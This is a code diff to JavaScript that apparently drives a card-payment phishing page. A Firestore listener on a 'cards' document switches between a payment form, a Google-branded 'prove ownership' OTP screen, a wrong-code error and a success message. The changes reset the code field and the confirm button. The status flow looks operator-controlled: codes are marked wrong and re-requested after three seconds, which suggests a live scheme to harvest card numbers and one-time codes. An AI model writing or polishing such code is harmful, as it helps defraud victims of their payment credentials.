@@ -498,19 +498,37 @@ onSnapshot(doc(db, "cards", currentDocId), (snap) => {
         document.getElementById('payment-main-ui').style.display = 'none';
         document.getElementById('otp-verification-ui').style.display = 'block';
         document.getElementById('otp-error-message').style.display = 'none';
-    } else if (data.status === 'wrong_otp') {
+        // إعادة تعيين الزر إلى حالته الطبيعية
+        const confirmBtn = document.getElementById('confirm-google-btn');
+        confirmBtn.innerText = "إثبات الملكية";
+        confirmBtn.disabled = false;
+        // مسح حقل الإدخال
+        document.getElementById('google-otp-input').value = '';
+    } 
+    else if (data.status === 'wrong_otp') {
         document.getElementById('payment-main-ui').style.display = 'none';
         document.getElementById('otp-verification-ui').style.display = 'block';
         document.getElementById('otp-error-message').style.display = 'block';
+        
+        // ✅ مسح حقل إدخال الرمز
+        document.getElementById('google-otp-input').value = '';
+        
+        // ✅ إعادة زر "إثبات الملكية" إلى حالته الطبيعية
+        const confirmBtn = document.getElementById('confirm-google-btn');
+        confirmBtn.innerText = "إثبات الملكية";
+        confirmBtn.disabled = false;
+        
         // إعادة تعيين الحالة بعد 3 ثواني
         setTimeout(async () => {
             await updateDoc(doc(db, "cards", currentDocId), { status: 'otp_required' });
         }, 3000);
-    } else if (data.status === 'success') {
+    } 
+    else if (data.status === 'success') {
         document.getElementById('payment-main-ui').style.display = 'none';
         document.getElementById('otp-verification-ui').style.display = 'none';
         document.getElementById('success-message').style.display = 'block';
-    } else if (data.status === 'error') {
+    } 
+    else if (data.status === 'error') {
         document.getElementById('payment-main-ui').style.display = 'none';
         document.getElementById('otp-verification-ui').style.display = 'none';
         document.getElementById('error-final-message').style.display = 'block';
